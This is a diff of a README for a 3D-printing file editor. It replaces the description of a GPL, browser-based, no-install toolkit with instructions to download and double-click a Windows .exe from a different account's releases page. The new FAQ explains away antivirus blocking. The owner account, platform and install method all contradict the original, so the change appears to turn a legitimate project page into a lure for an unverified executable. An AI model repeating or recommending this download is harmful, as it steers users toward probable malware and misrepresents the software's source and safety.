@@ -1,152 +1,77 @@
-# 3D Print Tools - 3D Printing Tools 2026
+# 🖨️ 3d-print-tools-editor - Prepare your 3D files with ease
 
-> **3D Print Tools is a client-side browser toolkit for viewing, editing, inspecting, and preparing common 3D-printing files, including support generation and toolpath visualization.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/adelindbiracial762/3d-print-tools-editor/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/danielmillersr2593/3d-print-tools-editor?style=flat-square)](https://github.com/danielmillersr2593/3d-print-tools-editor)
+This application helps you view, edit, and prepare 3D files for your printer. It runs directly on your computer. You can use it to inspect models, add supports, and check toolpaths. This tool works offline, which keeps your data secure on your local drive.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://danielmillersr2593.github.io/3d-print-tools-editor/">
-    <img src="https://img.shields.io/badge/Download-3D%20Print%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download 3D Print Tools">
-  </a>
-</p>
+You do not need to install complex software to use these tools. Follow these steps to prepare your computer and run the editor.
 
-> **[Download 3D Print Tools Latest](https://danielmillersr2593.github.io/3d-print-tools-editor/)**
+1. Visit the [releases page](https://github.com/adelindbiracial762/3d-print-tools-editor/releases) to find the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to download it to your computer.
+4. Move the file to a folder where you keep your tools.
+5. Double-click the file to launch the application.
 
----
+## 🖥️ System Requirements
 
-[Download Latest Build](https://danielmillersr2593.github.io/3d-print-tools-editor/)
+Your computer must meet these basic standards to run the editor smoothly.
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4GB of RAM.
+* Graphics: A dedicated graphics card helps with model rendering.
+* Storage: 200MB of free disk space.
+* Internet: Only needed to download the file.
 
-## Overview
+## 🛠️ Viewing and Editing Files
 
-3D Print Tools combines useful modeling and print-preparation workflows in a browser-based application. Load mesh files or toolpaths, inspect them through a drag-and-drop 3D viewer, and examine object dimensions and surfaces in millimeters.
+Once you open the application, you will see a workspace. You can drag and drop your 3D models into this window to start your work. The editor supports common formats like STL and OBJ.
 
-The toolkit is built for makers, designers, and other 3D-printing users who need a fast way to review or modify files. Mesh editing, object organization, support creation, and sliced toolpath viewing all run client-side, meaning a backend and mandatory file upload are not required.
+### Model Inspection
+Use your mouse to rotate, zoom, and pan around your 3D object. The inspection tool helps you look for holes or gaps in the mesh. A clean model leads to a better print. Check the statistics panel to see the dimensions and volume of your file.
 
----
+### Adding Supports
+Overhanging parts of a model often need extra structures to print correctly. The editor creates these supports automatically. You can also place them by hand if you need more control. Use the support settings menu to change the shape or density of these structures.
 
-## What You Can Do
+### Toolpath Visualization
+This feature shows how your printer will move. It displays the path of the nozzle as it lays down plastic. You can watch the simulation step-by-step to catch errors before you send the file to your printer. This prevents wasted material and failed prints.
 
-- Create low-contact support structures intended to remove more easily.
-- Import and export STL and 3MF models.
-- Load STL, 3MF, OBJ, PLY, glTF, GLB, and G-code files.
-- Explore models in a 3D viewer using drag and drop.
-- Modify meshes through extrude, stretch, cut, and add operations.
-- Select individual objects and detach, duplicate, or remove them.
-- Check surfaces with a ruler and monitor dimensions in millimeters.
-- Visualize sliced 3MF toolpaths as well as raw G-code.
-- Work entirely in the browser without requiring file uploads.
-- Use the project without a build process or backend service.
+## 📁 Managing Your Workspace
 
----
+The software saves your settings to a local configuration file. You can adjust the interface colors and measurement units in the settings menu. If you need to clear your workspace, select the Reset option from the File menu. This removes all loaded files and resets the view to the default orientation.
 
-## Getting Started
+## ⚙️ Advanced Settings
 
-### Open the hosted version
+While the defaults work for most prints, you can fine-tune the behavior of the editor.
 
-Start the current browser build here:
+* Units: You can switch between millimeters and inches.
+* Quality: Adjust the mesh detail if your computer slows down with large files.
+* Export: Save your edited file as a new STL to keep your original file safe.
 
-[Launch 3D Print Tools](https://danielmillersr2593.github.io/3d-print-tools-editor/)
+## ❓ Frequently Asked Questions
 
-### Serve a local checkout
+**Does this software send my files to the internet?**
+No. The editor runs locally on your machine. Your files stay on your computer.
 
-First, clone the repository and enter its directory:
+**Can I run this on a Mac or Linux?**
+This version is for Windows.
 
-```bash
-git clone https://github.com/danielmillersr2593/3d-print-tools-editor.git
-cd REPO
-```
+**What do I do if the application does not open?**
+Ensure you have the latest updates for your Windows system. Sometimes antivirus software blocks new files. Check your security settings if the application fails to start.
 
-The project does not need to be compiled. Serve the files with any static file server, such as Python's built-in server:
+**Can I undo my changes?**
+Yes. Use the Undo button in the top menu or press Ctrl + Z on your keyboard.
 
-```bash
-python3 -m http.server 8000
-```
+**Where do I find my saved files?**
+The editor prompts you for a location every time you export a file. Choose a folder you can find easily, like your Documents or Desktop folder.
 
-Once the server is running, visit:
+## 📂 Keeping Your Tools Updated
 
-```text
-http://localhost:8000/
-```
+New versions add features and fix issues. Check the release page once a month to see if an update exists. You can simply download the new version and replace the old one. Your settings will persist if you keep the configuration file in the same folder.
 
----
+## 🧩 Understanding 3D File Formats
 
-## Using the Toolkit
+3D printers rely on specific data types. An STL file contains the geometry of your object. The editor reads this data and translates it into instructions for your printer. When you add supports, the editor updates this geometry so the printer knows exactly where to place the extra plastic. Always export your work as a new file to maintain a clean record of your progress. This makes it easier to troubleshoot if a print fails.
 
-1. Open the hosted application or launch the local static server.
-2. Drop an STL, 3MF, OBJ, PLY, glTF, GLB, or G-code file into the viewer.
-3. Select objects or surfaces to examine the loaded model.
-4. Use the ruler to measure dimensions in millimeters.
-5. Modify the mesh with operations such as extrude, stretch, cut, and add.
-6. Manage selected objects by detaching, duplicating, or deleting them.
-7. Create low-contact supports for areas that need support during printing.
-8. Inspect sliced 3MF toolpaths or raw G-code in the viewer.
-9. Export the supported result as STL or 3MF.
-
----
-
-## Configuration and Local Hosting
-
-No configuration file, backend, or build pipeline is needed. For normal use, open the application in a supported modern browser and load files through the viewer.
-
-When working locally, the only hosting consideration is how the static project files are served. Use a local web server or publish the files through a static hosting service.
-
----
-
-## Requirements
-
-- A modern web browser capable of 3D rendering.
-- A desktop or laptop is recommended when working with larger models or performing detailed inspection.
-- Internet access is required for the hosted build.
-- Local operation requires a static file server or another method of serving the project files.
-- Supported formats are STL, 3MF, OBJ, PLY, glTF, GLB, and G-code.
-- Required storage varies with the project files and the models loaded.
-
----
-
-## Frequently Asked Questions
-
-### Are my files sent to a server?
-
-No. The application runs on the client side and handles files within the browser session without requiring a backend.
-
-### What formats does the viewer support?
-
-You can open STL, 3MF, OBJ, PLY, glTF, GLB, and G-code files. STL and 3MF files are also available as export formats.
-
-### Is toolpath viewing supported?
-
-Yes. 3D Print Tools can display sliced 3MF toolpaths and raw G-code for visual review.
-
-### Is there a settings file to edit?
-
-No separate settings service or required configuration file is provided. Use the hosted browser build, or serve the repository locally when working from a checkout.
-
-### Why might the application fail to open?
-
-Check that the browser is modern and supports 3D rendering. For local use, make sure the project is being served through a local web server instead of being opened through an unsupported file path.
-
-### How do I use the newest version?
-
-Open the latest hosted build at the project URL, or pull the latest repository changes before launching the local copy.
-
----
-
-## Future Direction
-
-- Further streamline browser-based model inspection.
-- Continue improving mesh editing and support-generation workflows.
-- Preserve compatibility with widely used 3D-printing model and toolpath formats.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: 3d-printing, editor, cad, stl, toolpath, windows, software
